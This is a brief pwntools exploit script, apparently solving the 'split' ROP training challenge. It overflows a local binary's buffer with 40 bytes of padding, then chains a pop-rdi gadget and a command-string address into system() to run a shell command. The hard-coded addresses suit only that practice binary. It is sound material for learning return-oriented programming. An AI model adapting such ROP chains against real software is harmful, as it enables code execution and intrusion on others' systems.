from pwn import *

pop_rdi = p64(0x4007c3)
system = p64(0x40074b)
bincat_addr = p64(0x601060)

payload = b'A'*40 + pop_rdi + bincat_addr + system

p = process('./split')
p.recvuntil('> ')

p.sendline(payload)
p.interactive()
